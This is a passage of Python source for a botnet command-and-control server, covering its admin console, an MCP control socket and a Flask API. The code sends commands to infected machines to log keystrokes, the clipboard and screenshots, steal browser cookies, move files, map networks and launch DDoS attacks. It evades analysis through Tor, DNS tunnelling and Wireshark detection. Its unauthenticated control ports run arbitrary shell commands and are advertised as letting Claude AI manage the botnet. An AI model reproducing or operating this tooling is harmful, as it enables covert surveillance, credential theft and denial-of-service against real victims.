                        print(f"\033[92m[+] File download command sent: {bot_id}\033[0m")
                        print(f"\033[94m[*] Target directory: {remote_path}\033[0m")
                        print(f"\033[94m[*] Download location: {downloads_dir}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('keylogger start '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "keylogger_start"):
                        print(f"\033[92m[+] Keylogger started: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('keylogger stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "keylogger_stop"):
                        print(f"\033[92m[+] Keylogger stopped: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('network_map '):
                    parts = cmd.split()
                    if len(parts) >= 3:
                        action = parts[1]
                        bot_id = parts[2]
                        
                        if action == 'start':
                            scope = parts[3] if len(parts) > 3 else '192.168.1.0/24'
                            if self.send_command(bot_id, f"network_map_start {scope}"):
                                print(f"\033[92m[+] Network mapping started: {bot_id} - {scope}\033[0m")
                                print(f"\033[94m[*] Collecting device name, MAC, IP and service information...\033[0m")
                            else:
                                print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                        
                        elif action == 'status':
                            if self.send_command(bot_id, "network_map_status"):
                                print(f"\033[92m[+] Network mapping status queried: {bot_id}\033[0m")
                            else:
                                print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                        
                        elif action == 'stop':
                            if self.send_command(bot_id, "network_map_stop"):
                                print(f"\033[92m[+] Network mapping stopped: {bot_id}\033[0m")
                            else:
                                print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                        
                        else:
                            self._show_command_help('network_map')
                    else:
                        self._show_command_help('network_map')
                
                elif cmd == 'network_maps':
                    print("\n\033[95mNetwork Maps Status:\033[0m")
                    status = self.get_network_maps_status()
                    
                    if status['enabled']:
                        print(f"  \033[96m•\033[0m Network Mapping: \033[92mENABLED\033[0m")
                        print(f"  \033[96m•\033[0m Total Maps: \033[93m{status['total_maps']}\033[0m")
                        print(f"  \033[96m•\033[0m Storage Directory: \033[93m{self.network_maps_dir}/\033[0m")
                        
                        if status['maps']:
                            print("\n\033[95mAvailable Maps:\033[0m")
                            for bot_id, map_info in status['maps'].items():
                                timestamp = time.ctime(map_info['timestamp'])
                                scope = map_info['scope']
                                nodes = map_info['nodes_count']
                                links = map_info['links_count']
                                
                                print(f"  \033[96m•\033[0m {bot_id}")
                                print(f"     \033[93mScope:\033[0m {scope}")
                                print(f"     \033[93mDate:\033[0m {timestamp}")
                                print(f"     \033[93mDevices:\033[0m {nodes} nodes, {links} links")
                                print(f"     \033[93mFiles:\033[0m JSON, Mermaid, Markdown")
                                print()
                        else:
                            print("  \033[93m[!] No network maps available\033[0m")
                    else:
                        print("  \033[91m[!] Network mapping disabled\033[0m")
                    print()

                elif cmd.startswith('stop '):
                    bot_id = cmd.split(maxsplit=1)[1]
                    if self.send_command(bot_id, "stop"):
                        print(f"\033[92m[+] Stop command sent to {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('broadcast '):
                    command = cmd.split(maxsplit=1)[1]
                    
                    if self.broadcast_command(command):
                        with self.lock:
                            count = len(self.bots)
                        print(f"\033[92m[+] Command broadcasted to {count} bots\033[0m")
                    else:
                        print("\033[91m[!] No active bots to broadcast\033[0m")
                
                elif cmd == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.show_banner()
                
                elif cmd.startswith('av_bypass '):
                    print("\033[91m[!] 'av_bypass' command is disabled for safety\033[0m")
                
                elif cmd.startswith('av_status '):
                    print("\033[91m[!] 'av_status' command is disabled for safety\033[0m")
                
                elif cmd.startswith('system_copy '):
                    print("\033[91m[!] System copy functionality DISABLED for safety\033[0m")
                    print("\033[91m[!] Auto-replication has been removed from the bot\033[0m")
                
                elif cmd.startswith('copy_status '):
                    print("\033[91m[!] Copy status functionality DISABLED for safety\033[0m")
                    print("\033[91m[!] System replication has been removed from the bot\033[0m")
                
                # AI-P2P commands removed
                
                # ==================== CMD COMMAND SYSTEM ====================
                elif cmd.startswith('cmd '):
                    parts = cmd.split(maxsplit=2)
                    if len(parts) < 3:
                        self._show_command_help('cmd')
                        continue
                        
                    bot_id = parts[1]
                    command = parts[2]
                    
                    # Command validation
                    allowed_commands = ['whoami', 'ls', 'pwd', 'isvm', 'sysinfo', 'screenshot', 'keylogger']
                    
                    if command.split()[0] not in allowed_commands:
                        print(f"\033[91m[!] Command '{command}' not allowed\033[0m")
                        print(f"\033[94m[*] Allowed commands: {', '.join(allowed_commands)}\033[0m")
                        continue
                    
                    if self.send_command(bot_id, command):
                        print(f"\033[92m[+] Command '{command}' sent to {bot_id}\033[0m")
                        print(f"\033[94m[*] Waiting for response...\033[0m")
                    else:
                        print(f"\033[91m[!] Bot {bot_id} not found\033[0m")
                
                elif cmd == 'exit':
                    self.active = False
                    print("\033[91m[!] Shutting down server...\033[0m")
                    os._exit(0)
                
                elif cmd == 'mcp on':
                    if self.mcp_enabled:
                        print("\033[93m[!] MCP server is already running\033[0m")
                    else:
                        try:
                            if self.start_mcp_control_server():
                                self.mcp_enabled = True
                                print("\033[92m[+] MCP server started\033[0m")
                                print("\033[94m[*] Claude AI can now manage this C2 server\033[0m")
                                print("\033[94m[*] MCP control server running on port 5001\033[0m")
                            else:
                                print("\033[91m[!] Failed to start MCP server\033[0m")
                        except Exception as e:
                            print(f"\033[91m[!] MCP server start error: {e}\033[0m")
                
                elif cmd == 'mcp off':
                    if not self.mcp_enabled:
                        print("\033[93m[!] MCP server is not running\033[0m")
                    else:
                        try:
                            if self.mcp_server:
                                self.mcp_server.stop()
                            self.mcp_enabled = False
                            self.mcp_server = None
                            print("\033[92m[+] MCP server stopped\033[0m")
                        except Exception as e:
                            print(f"\033[91m[!] MCP server stop error: {e}\033[0m")
                
                elif cmd == 'mcp status':
                    print("\n\033[95mMCP Server Status:\033[0m")
                    print(f"  \033[96m•\033[0m Status: \033[93m{'RUNNING' if self.mcp_enabled else 'STOPPED'}\033[0m")
                    print(f"  \033[96m•\033[0m Claude AI: \033[93m{'CONNECTED' if self.mcp_enabled else 'DISCONNECTED'}\033[0m")
                    print("\n\033[95mMCP Status:\033[0m \033[94mMONITORING\033[0m\n")
                    
                else:
                    print("\033[91m[!] Unknown command. Type 'help' for options\033[0m")
                    
            except Exception as e:
                print(f"\033[91m[!] Console error: {e}\033[0m")

    def start(self):
        self.active = True
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.host, self.port))
            s.listen(5)

            threading.Thread(target=self.cleaner, daemon=True).start()
            threading.Thread(target=self.admin_console, daemon=True).start()
            
            while self.active:
                try:
                    conn, addr = s.accept()
                    threading.Thread(target=self.handle_bot, args=(conn, addr)).start()
                except:
                    if self.active:
                        print("\033[91m[!] Server socket error\033[0m")
                    break

    def start_web_dashboard(self):
        """Start the web dashboard"""
        if not WEB_DASHBOARD_AVAILABLE:
            print("\033[91m[!] Flask not installed. Install with: pip install flask\033[0m")
            return False
            
        if self.web_dashboard_enabled:
            print("\033[93m[!] Web dashboard already running\033[0m")
            return False
            
        try:
            self.web_dashboard_enabled = True
            self.web_dashboard_thread = threading.Thread(
                target=start_web_dashboard,
                args=(self, self.web_dashboard_host, self.web_dashboard_port),
                daemon=True
            )
            self.web_dashboard_thread.start()
            print(f"\033[92m[+] Web dashboard started: http://{self.web_dashboard_host}:{self.web_dashboard_port}\033[0m")
            return True
        except Exception as e:
            print(f"\033[91m[!] Web dashboard startup error: {e}\033[0m")
            self.web_dashboard_enabled = False
            return False
    
    def stop_web_dashboard(self):
        """Stop the web dashboard"""
        if not self.web_dashboard_enabled:
            print("\033[93m[!] Web dashboard not running\033[0m")
            return False
            
        try:
            self.web_dashboard_enabled = False
            print("\033[92m[+] Web dashboard stopped\033[0m")
            return True
        except Exception as e:
            print(f"\033[91m[!] Web dashboard stop error: {e}\033[0m")
            return False
    
    def start_mcp_control_server(self):
        """Start MCP control server for socket communication"""
        try:
            import socket
            import threading
            import json
            
            mcp_port = 5001
            control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            control_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            control_socket.bind(('0.0.0.0', mcp_port))
            control_socket.listen(5)
            
            def handle_mcp_command(client):
                """Handle MCP commands"""
                try:
                    data = client.recv(4096).decode()
                    request = json.loads(data)
                    command = request.get('command', '')
                    
                    # Execute command
                    result = self.execute_command_for_mcp(command)
                    
                    # Send result
                    response = json.dumps({'result': result})
                    client.send(response.encode())
                except Exception as e:
                    error_response = json.dumps({'error': str(e)})
                    client.send(error_response.encode())
                finally:
                    client.close()
            
            def run_mcp_server():
                """Run MCP control server"""
                print(f"\033[92m[+] MCP control server started on port {mcp_port}\033[0m")
                while self.active:
                    try:
                        client, addr = control_socket.accept()
                        threading.Thread(target=handle_mcp_command, args=(client,)).start()
                    except:
                        break
            
            # Start MCP control server in separate thread
            mcp_thread = threading.Thread(target=run_mcp_server, daemon=True)
            mcp_thread.start()
            
            return True
        except Exception as e:
            print(f"\033[91m[!] MCP control server start error: {e}\033[0m")
            return False
    
    def execute_command_for_mcp(self, command):
        """Execute command for MCP - returns rich output matching admin_console"""
        import io
        import sys
        
        parts = command.strip().split()
        main_cmd = parts[0] if parts else ''
        
        # Capture print output to match admin_console behavior
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            if main_cmd == 'list':
                with self.lock:
                    if not self.bots:
                        print("[!] No active bots")
                    else:
                        print("\nActive Bots:")
                        for bot_id, bot in self.bots.items():
                            p2p_status = self.p2p_status.get(bot_id, {}).get('status', 'unknown')
                            has_alert = bot_id in self.wireshark_alerts
                            
                            p2p_icon = "Active" if p2p_status == 'active' else "Stopped" if p2p_status == 'stopped' else "Unknown"
                            alert_icon = "Alert" if has_alert else "Clean"
                            
                            print(f"  - {bot_id} ({bot['ip']})")
                            print(f"    Last seen: {time.ctime(bot['last_seen'])}")
                            print(f"    P2P Status: {p2p_icon}")
                            print(f"    Security: {alert_icon}")
                            print()
            
            elif main_cmd == 'server':
                print("\nServer Information:")
                print(f"  Host: {self.host}")
                print(f"  Port: {self.port}")
                print(f"  Encryption: AES-256-CBC")
                print(f"  Active Bots: {len(self.bots)}")
                print(f"  Server Status: ACTIVE")
                print()
                
            elif main_cmd == 'status':
                total = len(self.bots)
                active = sum(1 for b in self.bots.values() if b.get('active', False))
                print(f"Total bots: {total}")
                print(f"Active: {active}")
                print(f"Offline: {total-active}")
                
            elif main_cmd == 'info':
                if len(parts) < 2:
                    print("Usage: info <bot_id>")
                else:
                    bot_id = parts[1]
                    if bot_id not in self.bots:
                        print(f"Bot not found: {bot_id}")
                    else:
                        info = self.bots[bot_id]
                        print(f"=== {bot_id.upper()} ===")
                        print(f"IP: {info.get('ip', 'N/A')}")
                        print(f"OS: {info.get('os', 'N/A')}")
                        print(f"Platform: {info.get('platform', 'Unknown')}")
                        print(f"Status: {'Active' if info.get('active', False) else 'Inactive'}")
                        print(f"Last seen: {time.ctime(info.get('last_seen', 0))}")
            
            elif main_cmd == 'terminal':
                if len(parts) < 2:
                    print("Usage: terminal <command>")
                else:
                    terminal_cmd = ' '.join(parts[1:])
                    try:
                        import subprocess
                        result = subprocess.run(terminal_cmd, shell=True, capture_output=True, text=True, timeout=30)
                        output = result.stdout if result.stdout else result.stderr
                        print("=== TERMINAL OUTPUT ===")
                        print(f"Command: {terminal_cmd}")
                        print()
                        print(output)
                    except Exception as e:
                        print(f"Terminal error: {str(e)}")
            
            elif main_cmd == 'bot_cmd':
                if len(parts) < 3:
                    print("Usage: bot_cmd <bot_id> <command>")
                else:
                    bot_id = parts[1]
                    bot_command = ' '.join(parts[2:])
                    
                    if bot_id not in self.bots:
                        print(f"Bot not found: {bot_id}")
                    else:
                        try:
                            # Create a response storage for this command
                            import threading
                            command_response = {'output': None, 'event': threading.Event()}
                            
                            # Store pending response
                            if not hasattr(self, '_mcp_pending_responses'):
                                self._mcp_pending_responses = {}
                            self._mcp_pending_responses[bot_id] = command_response
                            
                            # Send command
                            result = self.send_command(bot_id, bot_command)
                            print(f"Command sent to {bot_id}: {bot_command}")
                            print("Waiting for response...")
                            
                            # Wait for response (max 10 seconds)
                            command_response['event'].wait(timeout=10)
                            
                            # Get output
                            output = command_response.get('output', 'No response received')
                            print(f"Response: {output}")
                            
                            # Cleanup
                            self._mcp_pending_responses.pop(bot_id, None)
                            
                        except Exception as e:
                            print(f"Bot command error: {str(e)}")
            
            elif main_cmd == 'help':
                print("""=== AVAILABLE COMMANDS ===
Bot Management:
  list              - Show connected bots
  info <bot_id>     - Show bot details
  stop <bot_id>     - Stop/kill a bot
  cmd <bot_id> <command> - Send command to bot
  broadcast <command> - Send command to all bots
  processes <bot_id> - Show running processes
  upload <bot_id> <file> - Upload file to bot
  download <bot_id> <path> - Download file from bot
  cookies <bot_id>  - Steal browser cookies

Server Info:
  server            - Show server information
  status            - Show bot count
  security          - Show security rules status
  p2p status        - Show P2P network status
  alerts            - Show security alerts
  web status        - Show web dashboard status

Tor Management:
  tor enable        - Start Tor service
  tor disable       - Stop Tor service
  tor renew         - Renew Tor identity
  tor status        - Show Tor status
  tor bots          - List Tor-connected bots
  clearnet bots     - List clearnet bots

Web Dashboard:
  web start         - Start web dashboard
  web stop          - Stop web dashboard

Show Commands:
  show exploits     - Show exploit database
  show stats        - Show system statistics
  show logs         - Show system logs
  show config       - Show configuration
  show history      - Show command history
  show files        - Show file system info
  show network      - Show network information

Bot Features:
  keylogger start/stop <bot_id> - Keylogger control
  copy start/stop <bot_id> - Clipboard logger control
  ss start/stop <bot_id> - Screenshot capture control

Network Mapping:
  network_map start/stop/status <bot_id> [scope]
  network_maps      - Show all network maps

DNS Tunnel:
  dns_tunnel enable/disable/status

DDoS (Educational):
  ddos start <bot_id> <target_ip> [--duration 30] [--threads 50]
  ddos stop <bot_id>

Other:
  clear             - Clear screen
  terminal <cmd>    - Run local terminal command
  help              - This message""")
            
            elif main_cmd == 'stop' and len(parts) > 1:
                bot_id = parts[1]
                if bot_id in self.bots:
                    if self.send_command(bot_id, 'stop'):
                        print(f"[+] Stop command sent to {bot_id}")
                    else:
                        print(f"[!] Failed to send stop command")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'security':
                print("\nSecurity Rules Status:")
                print(f"  Security Rules: {'ENABLED' if self.security_rules_enabled else 'DISABLED'}")
                print(f"  Rule #1: C2 Connected -> P2P OFF")
                print(f"  Rule #2: Wireshark Detected -> C2 + P2P OFF")
                print(f"  Rule #3: C2 Failed + No Wireshark -> P2P ON")
                with self.lock:
                    active_alerts = len(self.wireshark_alerts)
                    active_p2p = len([s for s in self.p2p_status.values() if s.get('status') == 'active'])
                print(f"  Active Security Alerts: {active_alerts}")
                print(f"  Active P2P Networks: {active_p2p}")
                print("\nSecurity Status: PROTECTED")
            
            elif main_cmd == 'p2p' and len(parts) > 1 and parts[1] == 'status':
                print("\nP2P Network Status:")
                with self.lock:
                    if not self.p2p_status:
                        print("  [!] No P2P activity detected")
                    else:
                        for bot_id, status_info in self.p2p_status.items():
                            status = status_info['status']
                            timestamp = time.ctime(status_info['timestamp'])
                            print(f"  - {bot_id}: {status} ({timestamp})")
                print(f"  P2P Port Range: {self.p2p_port_range}")
                print(f"  IPv6 Support: {'Enabled' if self.ipv6_enabled else 'Disabled'}")
            
            elif main_cmd == 'alerts':
                print("\nSecurity Alerts:")
                with self.lock:
                    if not self.wireshark_alerts and not hasattr(self, 'security_alerts'):
                        print("  [+] No security alerts")
                    else:
                        if self.wireshark_alerts:
                            print("  [*] Wireshark Alerts:")
                            for bot_id, alert_info in self.wireshark_alerts.items():
                                print(f"    - {bot_id}: {alert_info['message']}")
                        if hasattr(self, 'security_alerts') and self.security_alerts:
                            print("  [*] Security Alerts:")
                            for bot_id, alert_info in self.security_alerts.items():
                                print(f"    - {bot_id}: {alert_info['message']}")
            
            elif main_cmd == 'tor':
                if len(parts) > 1:
                    tor_cmd = parts[1]
                    if tor_cmd == 'enable':
                        if not self.tor_process:
                            if self.start_tor():
                                print("[+] Tor service started successfully")
                            else:
                                print("[!] Failed to start Tor service")
                        else:
                            print("[!] Tor service is already running")
                    elif tor_cmd == 'disable':
                        if self.tor_process:
                            if self.stop_tor():
                                print("[+] Tor service stopped successfully")
                            else:
                                print("[!] Failed to stop Tor service")
                        else:
                            print("[!] Tor service is not running")
                    elif tor_cmd == 'renew':
                        if self.tor_enabled:
                            self.renew_tor_identity()
                            print("[+] Tor identity renewed")
                        else:
                            print("[!] Tor mode is not active")
                    elif tor_cmd == 'status':
                        print(f"\nTor Status:")
                        print(f"  Tor Enabled: {'YES' if self.tor_enabled else 'NO'}")
                        print(f"  Tor Process: {'RUNNING' if self.tor_process else 'STOPPED'}")
                        tor_bots = [b for b in self.bots.items() if b[1].get('tor_enabled', False)]
                        print(f"  Tor Bots: {len(tor_bots)}")
                    elif tor_cmd == 'bots':
                        tor_bots = [b for b in self.bots.items() if b[1].get('tor_enabled', False)]
                        if tor_bots:
                            print("\nTor Connected Bots:")
                            for bot_id, bot in tor_bots:
                                print(f"  - {bot_id} ({bot['ip']})")
                        else:
                            print("[!] No Tor bots connected")
                    else:
                        print(f"Unknown tor command: {tor_cmd}")
                else:
                    print("Usage: tor <enable|disable|renew|status|bots>")
            
            elif main_cmd == 'clearnet' and len(parts) > 1 and parts[1] == 'bots':
                clearnet_bots = [b for b in self.bots.items() if not b[1].get('tor_enabled', False)]
                if clearnet_bots:
                    print("\nClearnet Connected Bots:")
                    for bot_id, bot in clearnet_bots:
                        print(f"  - {bot_id} ({bot['ip']})")
                else:
                    print("[!] No clearnet bots connected")
            
            elif main_cmd == 'web':
                if len(parts) > 1:
                    web_cmd = parts[1]
                    if web_cmd == 'start':
                        if self.start_web_dashboard():
                            print("[+] Web dashboard started successfully")
                        else:
                            print("[!] Failed to start web dashboard")
                    elif web_cmd == 'stop':
                        if self.stop_web_dashboard():
                            print("[+] Web dashboard stopped successfully")
                        else:
                            print("[!] Failed to stop web dashboard")
                    elif web_cmd == 'status':
                        print(f"\nWeb Dashboard Status:")
                        print(f"  Status: {'RUNNING' if self.web_dashboard_enabled else 'STOPPED'}")
                        print(f"  Host: {self.web_dashboard_host}")
                        print(f"  Port: {self.web_dashboard_port}")
                else:
                    print("Usage: web <start|stop|status>")
            
            elif main_cmd == 'show':
                if len(parts) > 1:
                    show_cmd = parts[1]
                    if show_cmd == 'exploits':
                        self._show_exploits()
                    elif show_cmd == 'stats':
                        self._show_stats()
                    elif show_cmd == 'logs':
                        self._show_logs()
                    elif show_cmd == 'config':
                        self._show_config()
                    elif show_cmd == 'history':
                        self._show_history()
                    elif show_cmd == 'files':
                        self._show_files()
                    elif show_cmd == 'network':
                        self._show_network()
                    else:
                        print(f"Unknown show command: {show_cmd}")
                else:
                    print("Usage: show <exploits|stats|logs|config|history|files|network>")
            
            elif main_cmd == 'processes' and len(parts) > 1:
                bot_id = parts[1]
                if bot_id in self.bots:
                    self._pending_processes_command = {'bot_id': bot_id}
                    if self.send_command(bot_id, 'processes'):
                        print(f"[*] Requesting process information from {bot_id}...")
                    else:
                        print(f"[!] Failed to send command")
                        self._pending_processes_command = None
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'cmd' and len(parts) > 2:
                bot_id = parts[1]
                bot_cmd = ' '.join(parts[2:])
                if bot_id in self.bots:
                    try:
                        import threading
                        command_response = {'output': None, 'event': threading.Event()}
                        if not hasattr(self, '_mcp_pending_responses'):
                            self._mcp_pending_responses = {}
                        self._mcp_pending_responses[bot_id] = command_response
                        
                        if self.send_command(bot_id, bot_cmd):
                            print(f"[*] Command sent to {bot_id}: {bot_cmd}")
                            command_response['event'].wait(timeout=10)
                            output = command_response.get('output', 'No response')
                            print(f"Response: {output}")
                        else:
                            print(f"[!] Failed to send command")
                        self._mcp_pending_responses.pop(bot_id, None)
                    except Exception as e:
                        print(f"[!] Error: {e}")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'broadcast' and len(parts) > 1:
                broadcast_cmd = ' '.join(parts[1:])
                if self.broadcast_command(broadcast_cmd):
                    print(f"[+] Broadcast command sent to all bots: {broadcast_cmd}")
                else:
                    print("[!] Failed to broadcast command")
            
            elif main_cmd == 'upload' and len(parts) > 2:
                bot_id = parts[1]
                file_path = parts[2]
                if not os.path.exists(file_path):
                    print(f"[!] File not found: {file_path}")
                elif bot_id in self.bots:
                    try:
                        with open(file_path, 'rb') as f:
                            file_bytes = f.read()
                        b64_data = base64.b64encode(file_bytes).decode('utf-8')
                        remote_name = os.path.basename(file_path)
                        self.command_queue.put({
                            'bot_id': bot_id,
                            'command': f"file_upload {remote_name} {b64_data}",
                            'action': 'file_upload',
                            'silent': True
                        })
                        print(f"[+] File upload queued: {remote_name} -> {bot_id}")
                    except Exception as e:
                        print(f"[!] Upload error: {e}")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'download' and len(parts) > 2:
                bot_id = parts[1]
                remote_path = parts[2]
                if bot_id in self.bots:
                    if self.send_command(bot_id, f"file_download {remote_path}"):
                        print(f"[+] Download command sent: {bot_id} -> {remote_path}")
                    else:
                        print(f"[!] Failed to send download command")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'cookies' and len(parts) > 1:
                bot_id = parts[1]
                if bot_id in self.bots:
                    if self.send_command(bot_id, "get_cookies"):
                        print(f"[+] Cookie request sent: {bot_id}")
                    else:
                        print(f"[!] Failed to send cookie request")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'keylogger' and len(parts) > 2:
                action = parts[1]
                bot_id = parts[2]
                if bot_id in self.bots:
                    cmd = f"keylogger_{action}"
                    if self.send_command(bot_id, cmd):
                        print(f"[+] Keylogger {action} command sent: {bot_id}")
                    else:
                        print(f"[!] Failed to send keylogger command")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'copy' and len(parts) > 2:
                action = parts[1]
                bot_id = parts[2]
                if bot_id in self.bots:
                    cmd = f"clipboard_{action}"
                    if self.send_command(bot_id, cmd):
                        print(f"[+] Clipboard logger {action} command sent: {bot_id}")
                    else:
                        print(f"[!] Failed to send clipboard command")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'ss' and len(parts) > 2:
                action = parts[1]
                bot_id = parts[2]
                if bot_id in self.bots:
                    cmd = f"ss_{action}"
                    if self.send_command(bot_id, cmd):
                        print(f"[+] Screenshot {action} command sent: {bot_id}")
                    else:
                        print(f"[!] Failed to send screenshot command")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'network_map' and len(parts) > 2:
                action = parts[1]
                bot_id = parts[2]
                scope = parts[3] if len(parts) > 3 else None
                if bot_id in self.bots:
                    if action == 'start':
                        cmd = f"network_map|start|{scope or 'local'}"
                    elif action == 'stop':
                        cmd = "network_map|stop"
                    elif action == 'status':
                        cmd = "network_map|status"
                    else:
                        print(f"[!] Unknown network_map action: {action}")
                        return
                    if self.send_command(bot_id, cmd):
                        print(f"[+] Network map {action} command sent: {bot_id}")
                    else:
                        print(f"[!] Failed to send network_map command")
                else:
                    print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'network_maps':
                if self.network_maps:
                    print("\nNetwork Maps:")
                    for bot_id, map_data in self.network_maps.items():
                        print(f"  - {bot_id}: {len(map_data.get('devices', []))} devices found")
                else:
                    print("[!] No network maps available")
            
            elif main_cmd == 'dns_tunnel':
                if len(parts) > 1:
                    action = parts[1]
                    if action == 'enable' and len(parts) > 2:
                        domain = parts[2]
                        self.start_dns_tunnel(domain)
                        print(f"[+] DNS tunnel enabled: {domain}")
                    elif action == 'disable':
                        self.stop_dns_tunnel()
                        print("[+] DNS tunnel disabled")
                    elif action == 'status':
                        print(f"\nDNS Tunnel Status:")
                        print(f"  Enabled: {'YES' if self.dns_tunnel_enabled else 'NO'}")
                        print(f"  Domain: {self.dns_tunnel_domain or 'Not set'}")
                        dns_bots = [b for b in self.bots.items() if b[1].get('dns_tunnel', False)]
                        print(f"  DNS Tunnel Bots: {len(dns_bots)}")
                else:
                    print("Usage: dns_tunnel <enable <domain>|disable|status>")
            
            elif main_cmd == 'ddos' and len(parts) > 1:
                ddos_cmd = parts[1]
                if ddos_cmd == 'start' and len(parts) > 3:
                    bot_id = parts[2]
                    target_ip = parts[3]
                    duration = 30
                    threads = 50
                    i = 4
                    while i < len(parts):
                        if parts[i] == '--duration' and i + 1 < len(parts):
                            duration = min(int(parts[i+1]), 300)
                            i += 2
                        elif parts[i] == '--threads' and i + 1 < len(parts):
                            threads = min(int(parts[i+1]), 100)
                            i += 2
                        else:
                            i += 1
                    if bot_id in self.bots:
                        ddos_command = f"ddos_start|{target_ip}|80|{duration}|{threads}"
                        if self.send_command(bot_id, ddos_command):
                            print(f"[+] DDoS attack started: {bot_id} -> {target_ip}")
                            print(f"    Duration: {duration}s, Threads: {threads}")
                        else:
                            print(f"[!] Failed to start DDoS attack")
                    else:
                        print(f"[!] Bot not found: {bot_id}")
                elif ddos_cmd == 'stop' and len(parts) > 2:
                    bot_id = parts[2]
                    if bot_id in self.bots:
                        if self.send_command(bot_id, "ddos_stop"):
                            print(f"[+] DDoS attack stopped: {bot_id}")
                        else:
                            print(f"[!] Failed to stop DDoS attack")
                    else:
                        print(f"[!] Bot not found: {bot_id}")
            
            elif main_cmd == 'clear':
                print("[+] Screen clear requested")
                
            else:
                print(f"Unknown command: {command}")
                print("Type 'help' for available commands")
                
        finally:
            sys.stdout = old_stdout
            
        return captured_output.getvalue()
    
    def start_mcp_api_server(self):
        """Start MCP API server"""
        if not WEB_DASHBOARD_AVAILABLE:
            print("\033[91m[!] Flask not installed. Install with: pip install flask\033[0m")
            return False
            
        try:
            from flask import Flask, jsonify, request
            
            app = Flask(__name__)
            
            @app.route('/api/bots', methods=['GET'])
            def list_bots():
                """List all connected bots"""
                try:
                    bots = list(self.bots.keys())
                    return jsonify({
                        'total_bots': len(bots),
                        'bots': bots,
                        'timestamp': datetime.now().isoformat()
                    })
                except Exception as e:
                    return jsonify({'error': str(e)}), 500
            
            @app.route('/api/bots/<bot_id>', methods=['GET'])
            def get_bot_info(bot_id):
                """Get detailed information about a bot"""
                try:
                    bot_info = self.bots.get(bot_id, {})
                    return jsonify({
                        'bot_id': bot_id,
                        'info': bot_info,
                        'timestamp': datetime.now().isoformat()
                    })
                except Exception as e:
                    return jsonify({'error': str(e)}), 500
            
            @app.route('/api/bots/<bot_id>/command', methods=['POST'])
            def execute_command(bot_id):
                """Execute command on a bot"""
                try:
                    data = request.get_json()
                    command = data.get('command', '')
                    result = self.send_command(bot_id, command)
                    return jsonify({
                        'bot_id': bot_id,
                        'command': command,
                        'result': result,
                        'timestamp': datetime.now().isoformat()
                    })
                except Exception as e:
                    return jsonify({'error': str(e)}), 500
            
            @app.route('/api/status', methods=['GET'])
            def get_status():
                """Get C2 server status"""
                try:
                    total_bots = len(self.bots)
                    active_bots = len([
                        b for b in self.bots.values() 
                        if b.get('active', False)
                    ])
                    
                    return jsonify({
                        'total_bots': total_bots,
                        'active_bots': active_bots,
                        'uptime': str(self.uptime) if hasattr(self, 'uptime') else 'unknown',
                        'timestamp': datetime.now().isoformat()
                    })
                except Exception as e:
                    return jsonify({'error': str(e)}), 500
            
            @app.route('/api/network', methods=['GET'])
            @app.route('/api/network/<bot_id>', methods=['GET'])
            def get_network_map(bot_id=None):
                """Get network map data"""
                try:
                    if bot_id:
                        network_data = self.network_maps.get(bot_id, {})
                    else:
                        network_data = self.network_maps
                    
                    return jsonify({
                        'network_data': network_data,
                        'timestamp': datetime.now().isoformat()
                    })
                except Exception as e:
                    return jsonify({'error': str(e)}), 500
            
            @app.route('/api/alerts', methods=['GET'])
            def get_security_alerts():
                """Get security alerts"""
                try:
                    alerts = []
                    for bot_id, bot_data in self.bots.items():
                        bot_alerts = bot_data.get('security_alerts', [])
                        for alert in bot_alerts:
                            alerts.append({
                                'bot_id': bot_id,
                                'alert': alert
                            })
                    
                    return jsonify({
                        'total_alerts': len(alerts),
                        'alerts': alerts,
                        'timestamp': datetime.now().isoformat()
                    })
                except Exception as e:
                    return jsonify({'error': str(e)}), 500
            
            # Start API server in separate thread using werkzeug for non-blocking
            from werkzeug.serving import make_server
            
            def run_flask():
                httpd = make_server('0.0.0.0', 8081, app, threaded=True)
                httpd.serve_forever()
            
            api_thread = threading.Thread(target=run_flask, daemon=True)
            api_thread.start()
            
            print("\033[92m[+] MCP API server started on port 8081\033[0m")
            return True
            
        except Exception as e:
            print(f"\033[91m[!] MCP API server start error: {e}\033[0m")
            return False
    
    def _init_vuln_scanner(self):
        """Initialize the Vulnerability Scanner system"""
        try:
            # Vulnerability Scanner message removed
            print(f"\033[36m[*]\033[0m \033[94mSupported platforms: \033[92mNVD\033[94m, \033[92mExploit-DB\033[94m, \033[92mCVE Details\033[94m, \033[92mSecurityFocus\033[94m, \033[92mPacketStorm\033[0m")
            self.vuln_scanner_enabled = True
                
        except Exception as e:
            print(f"\033[91m[!] Vulnerability Scanner initialization error: {str(e)}\033[0m")
    
    def process_bot_vulnerabilities(self, bot_id, vulnerabilities_data):
        """Process vulnerability data from bot"""
        try:
            if not self.vuln_scanner_enabled:
                return
            
